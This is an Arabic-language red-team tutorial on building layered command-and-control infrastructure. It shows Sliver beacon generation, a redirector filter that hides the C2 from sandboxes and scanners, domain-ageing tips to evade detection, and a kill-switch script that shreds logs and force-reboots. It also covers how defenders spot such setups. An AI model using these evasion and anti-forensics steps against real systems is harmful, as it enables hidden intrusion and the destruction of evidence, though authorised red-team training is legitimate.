# بنية تحتية للعمليات الهجومية: إزاي تبني &quot;مصنع&quot; يدوّر الهجوم من غير ما يبيعك؟

طب ليه أصلاً نتعب نبني infra؟ نشغّل Cobalt Strike على VPS ونسلّم؟

طب لو الـ VPS اتحرق؟
طب لو الـ Blue Team عرفوا الـ IP؟
طب لو CrowdStrike شال الـ domain من أول beacon؟

العملية كلها راحت. أسبوعين شغل + عقد توقّعت عليه + سمعتك = طار في عشر دقائق.

عشان كده اللي بيشتغل red team محترف ما بيعمل &quot;سيرفر واحد&quot; — هو بيبني <b>منظومة طبقات</b>. كل طبقة لو وقعت، اللي تحتها يفضل ساكن. ده مش paranoid، ده الفرق بين هاوي و operator.

> [!danger] قبل ما تكمل
> الكلام ده للعمليات المرخّصة بعقد مكتوب. أي بناء infra لاستهداف جهة من غير إذن = جناية CFAA + ترحيل + بلاك ليست. مفيش &quot;بس tested&quot;. مفيش &quot;بس شفت&quot;. ده بزنس يا نجم.

## غلطات الـ junior في بناء الـ infra

- بيشتري دومين من اسمه نفسه واضح إنه phishing (<code>microsoft-secure-login.tk</code>).
- بيشغّل الـ C2 على نفس الـ VPS اللي بيستضيف الـ phishing page.
- بيستخدم Cobalt Strike default profile — كل EDR في الدنيا عارف الـ JA3 بتاعه.
- بيستخدم نفس الـ infra في عمليتين مختلفتين، فلما واحدة اتحرقت، التانية مشيت معاها.
- بينسى يحط kill switch، فلما حسّ إنه اتكشف، قعد ساعتين يحاول يمسح يدوي والـ DFIR شالوا الـ disk image قبل ما يخلص.

## الهيكل اللي بيشتغل فعلياً

![بنية الـ red team](/images/lessons/redteam_infra_architecture_en.png)

السكة بتمشي كده: <b>Operator → VPN → Tier-2 redirector (CDN) → Tier-1 redirector (VPS) → C2 server → Victim</b>.

ليه التعقيد ده كله؟

عشان لما الـ Blue Team يلاقوا الـ IP اللي بيكلم الضحية، يلاقوا CDN. شغّال مع آلاف المواقع الشرعية. مش هينفع يبلوكه. لما يلاقوا Tier-1، يلاقوا redirector فاضي. الـ C2 الحقيقي مدفون ورا طبقتين، ومحدش وصله غير من ip معيّن.

## 1. اختيار الأرض — VPS و Domains

بُص. الـ Blue Team أول حاجة بيشوفها هي عمر الدومين وسمعته. لو الدومين متسجّل النهاردة، يبقا في 99% من الحالات phishing.

- <b>دومين قديم (Aged):</b> اشتري من <code>expireddomains.net</code> دومين بقاله سنتين أو تلاتة، كان شغّال شركة فعلية. سمعته جاهزة.
- <b>التصنيف (Categorization):</b> قبل أي حملة، اتأكد إن Talos و Symantec و BlueCoat بيصنّفوه &quot;Technology&quot; أو &quot;Business&quot;. لو &quot;Uncategorized&quot;، EDR هيقفله من أول طلب.
- <b>الاسم نفسه:</b> اختار اسم بيشبه &quot;normal SaaS&quot; — <code>cdn-cache-edge.com</code>، <code>monitoring-status-api.com</code>. مش <code>microsoft-update.com</code>. ده عيال صغيرة.

## 2. تأمين الـ C2 server

الـ C2 ده مقرّك. لو وقع، العملية كلها وقعت، والأخطر إن الأدلة كلها تروح لـ DFIR.

```bash
# اقفل كل حاجة. كل حاجة.
ufw default deny incoming
ufw allow from <operator-ip> to any port 22222
ufw enable

# SSH على بورت غير افتراضي + keys بس
sed -i 's/^#Port 22/Port 22222/' /etc/ssh/sshd_config
sed -i 's/^#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
sed -i 's/^#PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
systemctl restart ssh
```

ليه البورت غير الافتراضي؟ مش عشان &quot;security through obscurity&quot;. عشان لما scanner عمومي يدور على :22، الـ C2 بتاعك ما يبانش في scan results يومية. بتقلّل noise + بتقلّل احتمال الـ honeypot fingerprinting.

## 3. الـ Redirectors — البوابات اللي بتفصل الضحية عنك

الضحية ما تكلمش الـ C2 مباشرة. خالص. لو حصل، أنت اتحرقت.

الـ redirector وظيفته:
1. ينهي الـ TLS.
2. يفلتر الزيارات: لو UA معروف من Sandbox أو IP من VirusTotal/AnyRun → يبعت لصفحة Microsoft.com حقيقية.
3. لو الزيارة من الضحية الفعلية → يبعت للـ C2 الحقيقي.

```bash
# Caddy reverse proxy filter بسيط
@malicious {
    header_regexp User-Agent ^.*(curl|python|wget|VirusTotal).*$
    remote_ip 8.8.8.8 1.1.1.1 # ranges بتاعت السكان
}
handle @malicious {
    redir https://www.microsoft.com 302
}
handle {
    reverse_proxy https://c2-internal:443
}
```

## 4. تشغيل الـ C2 (Sliver كبديل OSS لـ Cobalt Strike)

ليه Sliver؟ لأن CS جاهز معاه IOCs محفوظة عند كل EDR في الدنيا. Sliver مفتوح، تقدر تعدّل profile الـ beacon، وتغيّر الـ JA3.

```bash
sliver
> https
> generate beacon --http https://cdn-cache-edge.com --save beacon.exe
> profiles new --http https://cdn-cache-edge.com --jitter 30 --interval 60 stealth
```

الـ jitter مهم. beacon كل 60 ثانية بالظبط = pattern. خلّيه 60s ± 30%، يبان random.

## 5. نظافة العملية — OPSEC اللي بيفرق

- <b>عملية واحدة = infra واحدة.</b> ما تستخدمش نفس الـ VPS لعميلين. لو واحد اتحرق، التاني يفضل آمن.
- <b>روابط استخدام واحد.</b> الـ payload لو اتنزل مرة، يتمسح أو الرابط يموت. ده بيموّت تحليل الـ Sandboxes اللي بييجوا بعدها بساعات.
- <b>توقيتات الشغل.</b> اشتغل بتوقيت نفس البلد بتاعت الضحية. لو الـ beacon بيبعث 3 صباحاً بتوقيت نيويورك، ده مش طبيعي.
- <b>logs على الـ C2:</b> اقفل الـ verbose logging. لو DFIR لقوا الـ box، ما تخليش history كامل لكل أمر.

## 6. الـ Kill Switch — زرار التدمير

لازم يكون عندك سكربت بضغطة واحدة يمسح كل أثر. مش &quot;لازم نعمل&quot; — لازم.

```bash
#!/bin/bash
# /opt/burn.sh — last resort
systemctl stop sliver-server caddy nginx
shred -uvz /opt/sliver/.sliver/teamserver.* 2>/dev/null
shred -uvz /var/log/auth.log /var/log/syslog 2>/dev/null
history -c
echo b > /proc/sysrq-trigger # reboot فوري بدون sync
```

## إزاي الـ Blue Team بيدور عليك؟

المدافعين الشطار ما بيدوروش على malware — هما بيدوروا على غلطاتك:

- <b>عمر الدومين:</b> WHOIS لسه طازة من أسبوع = إنذار أحمر.
- <b>JA3/JA4 fingerprint:</b> طريقة TLS handshake بتفضح الأداة. Cobalt Strike default JA3 معروف لكل SOC في العالم.
- <b>Passive DNS:</b> الدومين ده كان بيشاور على أنهي IPs قبل كده؟ لو الـ IPs بتاعتك ظهرت قبل كده مع دومينات تانية، شبكتك كلها مكشوفة.
- <b>Beaconing pattern:</b> RITA و Zeek + Spicy بيكتشفوا الـ jitter حتى لو 30%.

> [!info] قصة من الواقع
> Mandiant في 2022 طلعوا تقرير عن APT29 لقوا فيه إن المجموعة بتاعتهم بتشتري دومينات بقالها 5 سنين، بتقعد عليها سنة من غير ما تستخدمها (warming)، وبس بعدين يبدأوا الحملة. ده الفرق بين operator مدعوم من دولة وبين كيدي. الصبر.

## الخلاصة الناشفة

الـ infra مش جزء من الـ payload — الـ infra هي اللي بتحدد إنت هتخلص العملية ولا هتترحّل.

كل ما طبقاتك أكتر، كل ما تكلفة الكشف عليهم أعلى.
كل ما تكلفة الكشف أعلى، كل ما عندك وقت تخلص شغلك.

والعكس صحيح: شغل جامد + infra ضعيفة = نفس النتيجة بتاعت شغل عبيط على infra جامدة. اتحرقت.

ابني المصنع قبل ما تبدأ تشتغل. مش العكس.
